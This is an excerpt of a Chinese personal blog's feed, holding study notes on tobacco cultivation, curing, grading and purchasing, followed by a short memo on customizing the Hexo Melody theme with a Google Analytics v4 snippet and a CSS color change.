土壤要选择向阳平地，梯地，丘陵地，坡度要&lt;15°，PH值要介于5.0~7.0之间，以5.5~6.5为最佳，土壤的含氯量要小于45mg，小于30mg最佳。</p><h3 id="2-整地"><a class="markdownIt-Anchor" href="#2-整地"></a> 2. 整地</h3><p>  整地的主要目的是改善土壤状况，主要方式包括耕翻、碎垡、平整和起垄。耕深一般在20~30cm。</p><h3 id="3-起垄"><a class="markdownIt-Anchor" href="#3-起垄"></a> 3. 起垄</h3><p>  烤烟大都采用<code>垄作</code>和<code>地膜覆盖</code>。<br />  其中<code>“槽形垄”</code>和<code>“碟形垄”</code>适用于旱作烟区。<code>“梯形垄”</code>适用于降水量适中或稍大的烟区。<code>“拱形垄”</code>适用于烟草生长至成熟季节降雨量大的烟区。</p><h3 id="4-中耕"><a class="markdownIt-Anchor" href="#4-中耕"></a> 4. 中耕</h3><p>  中耕可以有效的调节土壤水、肥、气、热等状况，改善土壤环境条件，促进根系发育及上部烟株的早发快长。</p><h3 id="5-培土"><a class="markdownIt-Anchor" href="#5-培土"></a> 5. 培土</h3><p>  培土需要结合中耕时间适时进行。</p><h2 id="烟草轮作"><a class="markdownIt-Anchor" href="#烟草轮作"></a> 烟草轮作</h2><h3 id="1-前作"><a class="markdownIt-Anchor" href="#1-前作"></a> 1. 前作</h3><p>  烟草不适宜置于施用氮肥较多的作物或豆科作物之后。<br />  前作不能与烟草有同源病虫害，茄科植物、葫芦科植物不可作为前作。</p><h3 id="2-春烟轮作"><a class="markdownIt-Anchor" href="#2-春烟轮作"></a> 2. 春烟轮作</h3><p>  在春季的冬闲地上栽培的烟叫做春烟，占据我国烤烟面积的90%。</p><h3 id="3-烟稻轮作"><a class="markdownIt-Anchor" href="#3-烟稻轮作"></a> 3. 烟稻轮作</h3><p>  烤烟前作是水稻，种稻时灌水成为水田，种烟时排水成为旱田。<br />  在云南，主要有两种轮作方式：</p><ul><li><code>一年三熟</code>轮作：烤烟——晚稻——蚕豆</li><li><code>两年四熟</code>轮作：烤烟——油菜或小麦——蚕豆或小麦</li></ul><h2 id="烟草施肥"><a class="markdownIt-Anchor" href="#烟草施肥"></a> 烟草施肥</h2><p>  烟草施肥应以<code>基肥为主，追肥为辅</code>。<br />  主要施肥方式有：</p><ul><li>双层施肥</li><li>双条施肥</li><li>根外施肥</li></ul><h2 id="烟苗移栽"><a class="markdownIt-Anchor" href="#烟苗移栽"></a> 烟苗移栽</h2><h3 id="1-气候条件"><a class="markdownIt-Anchor" href="#1-气候条件"></a> 1. 气候条件</h3><p>  <code>温度</code>是决定移栽期的重要气候因素，日平均气温稳定在13~15℃，地温达到10℃以上，不再有晚霜危害是确定移栽期的重要依据。<br />  <code>降雨</code>的数量和分布也是确定移栽期的重要依据。对于优质的烤烟生产，在旺长期以前应当有适量的降雨，月降雨量为80~100mm。旺长期在降水比较均匀的情况下，月降水量以150~200mm较为理想。成熟期以月降水量100~120mm为好。<br />  一般认为，优质烟叶成熟阶段的日平均气温为20~50℃，并持续50天以上。</p><h3 id="2-环境生物"><a class="markdownIt-Anchor" href="#2-环境生物"></a> 2. 环境生物</h3><p>  烟草生长期间环境生物种类繁多，要避开病虫的易感期。</p><h3 id="3-移栽的适宜时期"><a class="markdownIt-Anchor" href="#3-移栽的适宜时期"></a> 3. 移栽的适宜时期</h3><p>  黄淮烟区：适时早栽<br />  河南、安徽：4月中旬至5月上旬移栽<br />  山东、陕西等有水浇条件的平原地区：4月下旬至5月中旬<br />  丘陵山区：5月中上旬<br />  东北地区：膜下移栽</p><h3 id="4-栽植密度"><a class="markdownIt-Anchor" href="#4-栽植密度"></a> 4. 栽植密度</h3><p>  雨量适中至较大，土层厚，土壤较肥沃的地区，种植密度以1100~1200株/亩为宜。<br />  丘陵山地，土壤较瘠薄且降雨量较少的旱作烟区以1200~1300株/亩为宜。<br />  多雨，寡照地区和稻烟轮作区，种植密度稍稀，以1050~1150株/亩为宜。</p><h3 id="5-移栽方法"><a class="markdownIt-Anchor" href="#5-移栽方法"></a> 5. 移栽方法</h3><ul><li>干栽：先栽烟后浇水</li><li>水栽：先浇水后栽烟</li><li>机械移栽：是未来的趋势</li></ul><h2 id="烟草地膜覆盖栽培"><a class="markdownIt-Anchor" href="#烟草地膜覆盖栽培"></a> 烟草地膜覆盖栽培</h2><h3 id="1-地膜覆盖栽培的效应"><a class="markdownIt-Anchor" href="#1-地膜覆盖栽培的效应"></a> 1. 地膜覆盖栽培的效应</h3><ul><li>提高土壤温度</li><li>稳定土壤的水分含量</li><li>提高土壤养分状况及肥料利用率</li><li>改善中下部叶光照条件</li><li>减轻病虫草害</li><li>促进烟草生长</li><li>稳定和提高烟叶产量品质</li></ul><h2 id="烟田水分管理"><a class="markdownIt-Anchor" href="#烟田水分管理"></a> 烟田水分管理</h2><h3 id="1-烤烟的需水规律"><a class="markdownIt-Anchor" href="#1-烤烟的需水规律"></a> 1. 烤烟的需水规律</h3><p>  总需水量前期少(16%~28%)，中期最多(44%~46%)，后期减少(35%~37%)。</p><h3 id="2-烟田的灌溉方法"><a class="markdownIt-Anchor" href="#2-烟田的灌溉方法"></a> 2. 烟田的灌溉方法</h3><ol><li>穴灌<br />  移栽和山丘无灌水条件的地方抗旱保苗，每穴1.5~2kg，每公顷60~90<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">m^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>。</li><li>沟灌<br />  是我国烟田最主要的灌水方法，沟灌一次需水量在150~300<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">m^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>/公顷。</li><li>喷灌<br />  节水，省工，增质，经济效益高。</li><li>滴灌<br />  节水，增产，增效，适用于丘陵和偏干旱地区。</li></ol><h3 id="3-水质要求"><a class="markdownIt-Anchor" href="#3-水质要求"></a> 3. 水质要求</h3><p>  应灌溉氯离子含量低的水，氯离子含量&lt;16mg/kg，矿化度&lt;0.6g/L为宜。<br />  铁铝氧化物含量高的水也不能用于烟田灌溉，否则烤后烟叶上会出现金属沉淀物。</p><h3 id="4-烟田排水"><a class="markdownIt-Anchor" href="#4-烟田排水"></a> 4. 烟田排水</h3><p>  水分过多会影响根系呼吸，要注意烟田及时排水防涝。</p><h2 id="烟草主要病害及防治"><a class="markdownIt-Anchor" href="#烟草主要病害及防治"></a> 烟草主要病害及防治</h2><h3 id="1-真菌病害28种"><a class="markdownIt-Anchor" href="#1-真菌病害28种"></a> 1. 真菌病害(28种)</h3><p>  炭疽病和猝倒病为<code>苗期的主要病害</code>。<br />  黑胫病，赤星病，根黑腐病，蛙眼病，白粉病在大田期危害较重。</p><h3 id="2-病毒病害16种"><a class="markdownIt-Anchor" href="#2-病毒病害16种"></a> 2. 病毒病害(16种)</h3><p>  病毒病害是对烟草生产<code>威胁最大</code>的一类病害。<br />  其中以烟草普通花叶病毒病，烟草黄瓜花叶病毒病，烟草马铃薯Y病毒病，烟草蚀纹病毒病分布广，危害重。</p><h3 id="3-细菌病害8种"><a class="markdownIt-Anchor" href="#3-细菌病害8种"></a> 3. 细菌病害(8种)</h3><p>  以烟草青枯病危害最重，其次为烟草野火病和角斑病。</p><h3 id="4-线虫病害3种"><a class="markdownIt-Anchor" href="#4-线虫病害3种"></a> 4. 线虫病害(3种)</h3><p>  主要有烟草根结线虫病，烟草胞囊线虫病和烟草根腐线虫病三大类。其中以<code>烟草根结线虫病</code>在我国发生范围最广，危害最重。</p><h3 id="5-不适宜气候引起的病害"><a class="markdownIt-Anchor" href="#5-不适宜气候引起的病害"></a> 5. 不适宜气候引起的病害</h3><p>  主要有气候斑点病，低温冷害或冻害，旱害，雨斑，日灼，雷击，雹害。<br />  其中以气候斑点病发生最为普遍，主要由大气污染，特别是臭氧毒害所引起，范围广危害重，目前<code>无有效措施</code>。</p><h2 id="烟草主要害虫及防治方法"><a class="markdownIt-Anchor" href="#烟草主要害虫及防治方法"></a> 烟草主要害虫及防治方法</h2><h3 id="1-地下害虫"><a class="markdownIt-Anchor" href="#1-地下害虫"></a> 1. 地下害虫</h3><p>  地下害虫是指危害期在土中生活的一类害虫，危害烟株的地下部分和地方部分近地面的嫩茎等，是<code>育苗期</code>的重要害虫。<br />  主要有<code>蝼蛄类</code>，<code>地老虎类</code>两种。</p><h3 id="2-刺吸性害虫"><a class="markdownIt-Anchor" href="#2-刺吸性害虫"></a> 2. 刺吸性害虫</h3><p>  刺吸性害虫是指以刺吸式口器或挫吸式口器危害植物的害虫。<br />  主要有<code>烟蚜（俗称蜜虫）</code>和<code>斑须蜻</code>两种。</p><h3 id="3-食蛀叶性害虫"><a class="markdownIt-Anchor" href="#3-食蛀叶性害虫"></a> 3. 食（蛀）叶性害虫</h3><p>  食（蛀）叶性害虫是指以咀嚼式口器直接取食植物叶片及嫩茎或钻蛀叶片和嫩茎内取食的一部分害虫，主要有<code>烟夜蛾</code>、棉铃虫、烟潜叶蛾、烟蛀茎蛾。</p><h2 id="烟田主要杂草及防治"><a class="markdownIt-Anchor" href="#烟田主要杂草及防治"></a> 烟田主要杂草及防治</h2><h3 id="1-烟田杂草种类"><a class="markdownIt-Anchor" href="#1-烟田杂草种类"></a> 1. 烟田杂草种类</h3><p>  我国烟草种植区域广阔，自然条件差异大，烟田杂草种类繁多。</p><h3 id="2-烟田杂草的防治技术"><a class="markdownIt-Anchor" href="#2-烟田杂草的防治技术"></a> 2. 烟田杂草的防治技术</h3><ol><li>苗床杂草的防除<br />  苗床土熏烧，苗床土熏蒸，人工除草和漂浮育苗技术。</li><li>大田杂草的防除<br />  农业栽培措施和化学除草技术。</li></ol><h2 id="打顶抹杈"><a class="markdownIt-Anchor" href="#打顶抹杈"></a> 打顶抹杈</h2><h3 id="1-打顶"><a class="markdownIt-Anchor" href="#1-打顶"></a> 1. 打顶</h3><p>  除繁殖种子外，需要及时打顶，促使营养物质集中供应叶片生长发育，增大有效叶面积。打顶还能促进根系生长，增强根系吸收能力。<br />  <code>“打顶适时，留叶适当”</code></p><h3 id="2-抹杈"><a class="markdownIt-Anchor" href="#2-抹杈"></a> 2. 抹杈</h3><p>  一般情况下，烟株的每个叶腋中潜育着3~4个腋芽，其中1个主芽和2~3个副芽。摘除主芽后，第一和第二副芽便会依次萌发。<br />  腋芽最好在生长至3~5cm时抹去，此时烟杈小，脆嫩好抹，伤口易愈合，并能促进叶片生长。</p><h2 id="烤烟的采收与调制"><a class="markdownIt-Anchor" href="#烤烟的采收与调制"></a> 烤烟的采收与调制</h2><h3 id="1-烟叶成熟度"><a class="markdownIt-Anchor" href="#1-烟叶成熟度"></a> 1. 烟叶成熟度</h3><p>  成熟度是烟叶质量的基础和最重要的品质因素。<br />  成熟期又分为<code>生理成熟期</code>，<code>工艺成熟期</code>和<code>成熟衰老期</code>。<br />  其中生理成熟期的生物学产量最高，工艺成熟期是烟叶田间生长发育达到烘烤加工和加工后工业可用性最好、最适宜的时期。</p><p>  成熟的特征主要有：</p><ul><li>叶色变浅</li><li>叶脉变白</li><li>茸毛脱落</li><li>容易采摘</li><li>叶尖下垂，茎叶角度增大</li><li>中上部烟叶的叶面起皱，叶面出现成熟斑，叶尖黄色成都增大或枯尖焦边。</li></ul><p>  按照烟叶在烟株上的出生时间推算，中下部叶在移栽后60天左右开始成熟，中部叶在75~85天开始成熟，上部叶在100~110天后进入成熟期。</p><h3 id="2-烟叶采收与编烟装烟"><a class="markdownIt-Anchor" href="#2-烟叶采收与编烟装烟"></a> 2. 烟叶采收与编烟装烟</h3><ol><li>烟叶采收<br />  成熟一片收一片，<code>生叶不收，熟叶不漏</code>。</li><li>编烟<br />  我国普遍采用绳索编烟，有<code>死扣编烟</code>，<code>活扣编烟</code>，<code>加扦梭线编烟</code>三种方法。基本要求是<code>分类编烟、疏密适当</code>。</li><li>装烟<br />  <code>分类装烟，疏密适当</code>。同一座烤房要做到同品种，同部位，同层同质。</li></ol><h3 id="3-烟叶在烘烤过程中的基本变化"><a class="markdownIt-Anchor" href="#3-烟叶在烘烤过程中的基本变化"></a> 3. 烟叶在烘烤过程中的基本变化</h3><p>  烟叶由<code>黄绿色</code>变为<code>黄色</code>。<br />  烟叶状态由<code>膨胀</code>变为<code>凋萎</code>，再变为<code>干燥</code>。</p><h3 id="4-烤烟三段式烘烤工艺"><a class="markdownIt-Anchor" href="#4-烤烟三段式烘烤工艺"></a> 4. 烤烟三段式烘烤工艺</h3><ol><li>变黄阶段<br />  叶面基本全部变黄，<code>黄片青筋</code>。主脉发软，凋萎塌架。</li><li>定色阶段</li><li>干筋阶段</li></ol><h3 id="5-烟叶回潮与下架"><a class="markdownIt-Anchor" href="#5-烟叶回潮与下架"></a> 5. 烟叶回潮与下架</h3><p>  烟叶烤干后含水量很低，极易破碎，须经过回潮使烟叶吸水变软。</p><h1 id="三-烟叶分级原理"><a class="markdownIt-Anchor" href="#三-烟叶分级原理"></a> 三、烟叶分级原理</h1><p>  按照<code>分类——分型——分组——分级</code>的原则进行。</p><ol><li>按照烟叶的调制方法，性质和用途进行<code>分类</code>。</li><li>同类烟叶按烟叶种植的生态类型来进行<code>分型</code>。</li><li>同一类型的烟叶按部位，颜色进行<code>分组</code>。</li><li>同一组的烟叶依据一定的分级因素进行<code>分级</code>。</li></ol><p>  烤烟烟叶共可划分42级，白肋烟可划分28级，香料烟可划分10级，美国烤烟可分153级，巴西烤烟可分48级。</p><h2 id="烤烟分级"><a class="markdownIt-Anchor" href="#烤烟分级"></a> 烤烟分级</h2><h3 id="1-组别划分"><a class="markdownIt-Anchor" href="#1-组别划分"></a> 1. 组别划分</h3><p>  可分为<code>主组</code>和<code>副组</code>。</p><ol><li>主组<br />  是为<code>生长发育正常，调制适当</code>的烟叶设置的。分组因素是<code>部位</code>和<code>颜色</code>，是依烟叶的着生部位和基本色（黄色）深浅划分的。</li><li>副组<br />  是为区分那些因<code>生长发育不良</code>或<code>采收不当</code>或<code>调制失误</code>以及其他原因造成的低质量烟叶设置的。</li></ol><h3 id="2-主组划分"><a class="markdownIt-Anchor" href="#2-主组划分"></a> 2. 主组划分</h3><ol><li>部位分组<br />  按照烟叶在烟株上着生位置不同，自上而下分为<code>脚叶</code>、<code>下二棚</code>、<code>腰叶</code>、<code>上二棚</code>、<code>顶叶</code>五个部分。</li><li>颜色分组<br />  按照基本色深浅划分为<code>柠檬黄色组</code>（正常和淡黄，呈纯正黄色，代号L），<code>橘黄色组</code>（深黄和金黄，以黄色为主，呈现较为明显的红色，代号F），<code>红棕色组</code>（桔红，浅红棕，红棕，呈明显的红棕色，代号R）。</li><li>完整叶组<br />  产生在上二棚以上（包含）位置，烟叶达到高度的或充分的成熟，油分少，烟质干燥，以手触摸有干燥感，页面皱折，颗粒多，有成熟的斑点，叶色深。</li><li>分组代号<ul><li>下部柠檬黄色组：<code>XL</code></li><li>下部桔黄色组：<code>XF</code></li><li>中部柠檬黄色组：<code>CL</code></li><li>中部桔黄色组：<code>CF</code></li><li>上部柠檬黄色组：<code>BL</code></li><li>上部桔黄色组：<code>BF</code></li><li>上部红棕色组：<code>BR</code></li><li>完整叶组：<code>H</code></li></ul></li></ol><h3 id="3-副组划分"><a class="markdownIt-Anchor" href="#3-副组划分"></a> 3. 副组划分</h3><ol><li>光滑叶组（S）<br />  光滑指烟叶组织平滑或僵硬，产生原因主要有光照不足，生长不良，成熟度差。光滑面积占全叶片<code>20%以上</code>的烟叶。</li><li>杂色叶组（K）<br />  可分为<code>中下部杂色组</code>和<code>上部杂色组</code>。杂色是指烟叶表面存在的非基本色的颜色斑块。</li><li>青黄烟组（GY）<br />  青黄色是指黄色烟叶上含有可见的青色且<code>不超过三成</code>，超过三成则不列级。</li><li>微带青叶组（V）<br />  青黄烟组中部分烟叶含青成都和面积均轻微，而其他品质因素又上号。叶脉带青或叶片含微浮青面积在10%以内，<code>二者不得同时并存</code>。</li></ol><h2 id="白肋烟分级"><a class="markdownIt-Anchor" href="#白肋烟分级"></a> 白肋烟分级</h2><h3 id="1-分组"><a class="markdownIt-Anchor" href="#1-分组"></a> 1. 分组</h3><ol><li>部位分组<br />  脚叶、下部叶（下二棚）、中部叶（腰叶）、上部叶（上二棚）、顶叶。</li><li>颜色分组<br />  基本色组和杂色组（K），其中基本色组又可分为：<ul><li>浅红黄色（L）</li><li>浅红棕色（F）</li><li>红棕色（R）</li></ul></li></ol><h3 id="2-分级"><a class="markdownIt-Anchor" href="#2-分级"></a> 2. 分级</h3><ol><li>成熟度<br />  过熟、成熟、熟、欠熟。</li><li>身份<br />  厚、稍厚、适中、稍薄、薄。</li><li>叶片结构<br />  松、疏松、尚疏松、稍密、密。</li><li>叶面<br />  舒展、展、稍皱、皱。</li><li>光泽<br />  明亮、亮、中、暗。</li><li>颜色强度<br />  浓、中、淡、差。</li><li>宽度<br />  阔、宽、中、窄。</li><li>长度<br />  55cm、50cm、45cm、40cm、35cm、30cm。</li><li>均匀度<br />  均匀度是指烟叶各项品质因素在页面均匀一致的程度，主要可分为90%、85%、80%、70%、60%。</li><li>损伤度<br />  损伤度是指烟叶受机械或人为因素，病虫害等的影响程度。</li></ol><h2 id="香料烟分级"><a class="markdownIt-Anchor" href="#香料烟分级"></a> 香料烟分级</h2><h3 id="1-分型"><a class="markdownIt-Anchor" href="#1-分型"></a> 1. 分型</h3><p>  香料烟可分为<code>B型香料烟</code>和<code>S型香料烟</code>。<br />  B型香料烟（Basma）叶片小，叶脉细，光泽好，弹性强，有<code>柔和的芳香</code>。主产区在云南，新疆。<br />  S型香料烟（Samsun）叶片小，叶脉细，光泽好，弹性强，但<code>芳香较浓</code>，有特殊的吃味。主产区在浙江，湖北，河南，湖南等地。</p><h3 id="2-分级-2"><a class="markdownIt-Anchor" href="#2-分级-2"></a> 2. 分级</h3><ol><li>部位<br />  顶叶、上二棚、腰叶、下二棚、脚叶。</li><li>叶片长度<ul><li>B型：8cm、10cm、14cm、18cm、20cm。</li><li>S型：12cm、16cm、18cm、20cm、22cm。</li></ul></li><li>颜色<ul><li>桔黄，金黄，深黄</li><li>正黄，淡黄</li><li>红棕，浅棕，褐色</li></ul></li><li>光泽<br />  可分为鲜明、尚鲜明、较暗、暗。</li><li>身份<br />  厚、中等、薄。</li><li>油分<br />  富有，有，少</li><li>组织结构<br />  细致、稍细致、较疏松、疏松</li><li>完整度<br />  90%、85%、80%、70%、60%</li><li>杂色与残份<br />  5%、10%、15%、20%、30%</li></ol><p>  下部叶组分三级，中部叶组分三级，上部叶组分三级，还有一个末级。</p><h1 id="四-烟叶收购"><a class="markdownIt-Anchor" href="#四-烟叶收购"></a> 四、烟叶收购</h1><h2 id="验收规格"><a class="markdownIt-Anchor" href="#验收规格"></a> 验收规格</h2><h3 id="1-烟叶水分检验"><a class="markdownIt-Anchor" href="#1-烟叶水分检验"></a> 1. 烟叶水分检验</h3><ol><li>含水率<br />  初烤烟的自然含水率为16%~18%。根据自然气候的不同情况，二三季度的初烤烟水分掌握为16%~17%，一四季度为16%~18%。<br />复烤烟的函数率为11%~13%。</li><li>检验方法<br />  主要有<code>仪器检验</code>和<code>经验性感官检验</code>两种。</li></ol><h3 id="2-砂土率"><a class="markdownIt-Anchor" href="#2-砂土率"></a> 2. 砂土率</h3><p>  调制后烟叶会自然粘附一些尘土，不仅减少烟叶的实际重量，更重要的是影响卷烟产品质量，烟叶出口以及卷烟工人的健康。</p><h3 id="3-等级纯度允差"><a class="markdownIt-Anchor" href="#3-等级纯度允差"></a> 3. 等级纯度允差</h3><p>  分级过程中不可避免会有一些误差。允许的误差范围是上等烟不超过10%，中等烟不超过15%，下等烟不超过20%。</p><h3 id="4-烟叶扎把"><a class="markdownIt-Anchor" href="#4-烟叶扎把"></a> 4. 烟叶扎把</h3><p>  每把25~30片叶，把头周长100~200mm，绕宽50mm，要用同级烟叶扎把。</p><h2 id="收购管理"><a class="markdownIt-Anchor" href="#收购管理"></a> 收购管理</h2><h3 id="1-收购前准备"><a class="markdownIt-Anchor" href="#1-收购前准备"></a> 1. 收购前准备</h3><p>  地市级公司，分（县）级公司管理层应制订详细的收购方案。</p><h3 id="2-入户预检"><a class="markdownIt-Anchor" href="#2-入户预检"></a> 2. 入户预检</h3><p>  按照<code>“质管前移，入户预检，约时定点，轮流交售”</code>的原则制订预检方案。</p><h3 id="3-初检编码"><a class="markdownIt-Anchor" href="#3-初检编码"></a> 3. 初检编码</h3><p>  检查交烟农户的种植收购合同、预约单，手续不全的不予初检。<br />  逐捆（袋）检查封签是否完好无损，有不明原因损毁的不予初检。</p><h3 id="4-定级"><a class="markdownIt-Anchor" href="#4-定级"></a> 4. 定级</h3><p>  根据国家标准进行定级。</p><h3 id="5-司磅"><a class="markdownIt-Anchor" href="#5-司磅"></a> 5. 司磅</h3><p>  司磅员须对磅秤进行调试。<br />  在确认筐中等级牌与电脑显示相同后方可过磅。</p><h3 id="6-结算"><a class="markdownIt-Anchor" href="#6-结算"></a> 6. 结算</h3><p>  收购信息要保证及时、准确。金融部门按照程序将售烟款存入烟农账户。</p><h3 id="7-散烟入库"><a class="markdownIt-Anchor" href="#7-散烟入库"></a> 7. 散烟入库</h3><p>  散把烟叶须由专人指引入库按等级分别堆码。</p><h3 id="8-成包打码"><a class="markdownIt-Anchor" href="#8-成包打码"></a> 8. 成包打码</h3><p>  当天收购的散把烟叶由仓管员监督指导当天成包。</p><h3 id="9-扫码调运"><a class="markdownIt-Anchor" href="#9-扫码调运"></a> 9. 扫码调运</h3><p>  出库时要逐包扫码调运，出库扫码单应随货同行。</p><h3 id="10-交接验收"><a class="markdownIt-Anchor" href="#10-交接验收"></a> 10. 交接验收</h3><p>  按程序调运到地市级公司，烟叶仓库或省级工业公司制定仓库后，由质检员根据原烟交接样品进行烟叶数量、质量检验查收。</p><h1 id="五-打叶复烤"><a class="markdownIt-Anchor" href="#五-打叶复烤"></a> 五、打叶复烤</h1><h2 id="打叶复烤概述"><a class="markdownIt-Anchor" href="#打叶复烤概述"></a> 打叶复烤概述</h2><h3 id="1-复烤的概念"><a class="markdownIt-Anchor" href="#1-复烤的概念"></a> 1. 复烤的概念</h3><p>  烟叶复烤是烟叶初烤后再次干燥的过程。<br />  初烤烟叶含水率16%~18%，不利于长期存储。</p><h3 id="2-复烤的作用"><a class="markdownIt-Anchor" href="#2-复烤的作用"></a> 2. 复烤的作用</h3><ul><li>调整烟叶水分</li><li>杀虫灭菌</li><li>改善烟叶品质</li><li>整理烟叶，去除砂土、杂物</li></ul><h3 id="3-打叶复烤流程"><a class="markdownIt-Anchor" href="#3-打叶复烤流程"></a> 3. 打叶复烤流程</h3><ol><li>原料准备</li><li>叶梗分离</li><li>叶片复烤</li><li>叶片包装</li><li>烟梗处理</li><li>碎叶处理</li></ol><h2 id="打叶复烤加工工序"><a class="markdownIt-Anchor" href="#打叶复烤加工工序"></a> 打叶复烤加工工序</h2><ol><li>计量、验收<br />  根据烟叶<code>含水率</code>和<code>板结情况</code>来进行验收。</li><li>预回潮<br />  主要有<code>真空回潮</code>和<code>预回潮房回潮</code>两种方式</li><li>选叶、选把<br />  主要有<code>人工选叶</code>和<code>光电辨色自动选叶</code>两种方式。</li><li>预配叶</li><li>铺叶、解把<br />  铺叶是解把的准备环节。主要有<code>辊刀式解把</code>和<code>打辊式解把</code>两种。</li><li>热风润叶</li><li>选叶<br />  根据原料，原料处理情况，厂家的要求来进行选择。</li><li>筛砂<br />  将砂土和散碎叶片筛出。主要有<code>振动筛</code>，<code>滚筒筛</code>以及<code>转辊除砂机</code>三种方式。</li><li>金属异物剔除</li><li>打叶去梗<br />  将叶片与烟梗分离。打叶后的物料是叶片、烟梗和带梗叶片三者的混合物，要在<code>风分器</code>中将三者分离。</li><li>烟片复烤<br />  将烟片的含水率调整到11%~13%，并适当改善烟片的内在质量。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-烟草的类型&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一-烟草的类型&quot;&gt;&lt;/a&gt; 一、烟草的类型&lt;/h1&gt;
&lt;p&gt;  烟草属于茄科烟属，主要可以分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;普通烟草（红花烟草）
&lt;ul&gt;
&lt;li&gt;烤烟&lt;/l</summary>
      
    
    
    
    <category term="烟草知识" scheme="https://coder.lufer.cc/categories/%E7%83%9F%E8%8D%89%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="烟草知识" scheme="https://coder.lufer.cc/tags/%E7%83%9F%E8%8D%89%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Melody主题个性化修改memo</title>
    <link href="https://coder.lufer.cc/Hexo/Melody%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E4%BF%AE%E6%94%B9memo/"/>
    <id>https://coder.lufer.cc/Hexo/Melody%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E4%BF%AE%E6%94%B9memo/</id>
    <published>2020-12-28T09:00:37.000Z</published>
    <updated>2021-04-20T08:32:44.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-修改为google-analytics-v4"><a class="markdownIt-Anchor" href="#1-修改为google-analytics-v4"></a> 1. 修改为Google Analytics V4</h2><p>  Google Analytics已更新到4.0版本，页面引用方式有变化，在Melody主题的dev分支下作者已经更新了代码，master分支需要手动修改。</p><p>  文件位置<code>\hexo-theme-melody\layout\includes\head.pug</code></p><p>  修改代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> theme.google_analytics</span><br><span class="line">  script(src=<span class="string">&quot;https://www.googletagmanager.com/gtag/js?id=&quot;</span>+theme.google_analytics)</span><br><span class="line">  script.</span><br><span class="line">      <span class="built_in">window</span>.dataLayer = <span class="built_in">window</span>.dataLayer || [];</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">gtag</span>(<span class="params"></span>)</span>&#123;dataLayer.push(<span class="built_in">arguments</span>);&#125;</span><br><span class="line">      gtag(<span class="string">&#x27;js&#x27;</span>, <span class="keyword">new</span> <span class="built_in">Date</span>());</span><br><span class="line">      gtag(<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;!&#123;theme.google_analytics&#125;&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2修改行内引用代码块颜色"><a class="markdownIt-Anchor" href="#2修改行内引用代码块颜色"></a> 2.修改行内引用代码块颜色</h2><p>  主题配置文件的颜色选项不能修改行内代码块的颜色，原颜色太淡。</p><p>  文件位置<code>\hexo-theme-melody\source\css\var.styl</code></p><p>  修改代码</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$code-background = rgba(101,196,235,0.2)</span><br></pre></td></tr></table></figure><p>  本文所做修改已打包至<code>hexo-theme-melody-lufer</code>，可通过<code>npm install hexo-theme-melody-lufer</code>来进行安装。</p><p>  使用此包注意要修改<code>_config.yml</code>中的<code>theme</code>为<code>theme: melody-lufer</code>。<br />  把主题配置文件名由<code>_config.melody.yml</code>改为<code>_config.melody-lufer.yml</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-修改为google-analytics-v4&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-修改为google-analytics-v4&quot;&gt;&lt;/a&gt; 1. 修改为Google Analytics V4&lt;/h2&gt;
&lt;p&gt;  Goo</summary>
      
    
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/categories/Hexo/"/>
    
    
    <category term="Github" scheme="https://coder.lufer.cc/tags/Github/"/>
    
    <category term="Hexo" scheme="https://coder.lufer.cc/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>中共中央关于制定国民经济和社会发展第十四个五年规划和二〇三五年远景目标的建议</title>
    <link href="https://coder.lufer.cc/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/%E4%B8%AD%E5%85%B1%E4%B8%AD%E5%A4%AE%E5%85%B3%E4%BA%8E%E5%88%B6%E5%AE%9A%E5%9B%BD%E6%B0%91%E7%BB%8F%E6%B5%8E%E5%92%8C%E7%A4%BE%E4%BC%9A%E5%8F%91%E5%B1%95%E7%AC%AC%E5%8D%81%E5%9B%9B%E4%B8%AA%E4%BA%94%E5%B9%B4%E8%A7%84%E5%88%92%E5%92%8C%E4%BA%8C%E3%80%87%E4%B8%89%E4%BA%94%E5%B9%B4%E8%BF%9C%E6%99%AF%E7%9B%AE%E6%A0%87%E7%9A%84%E5%BB%BA%E8%AE%AE/"/>
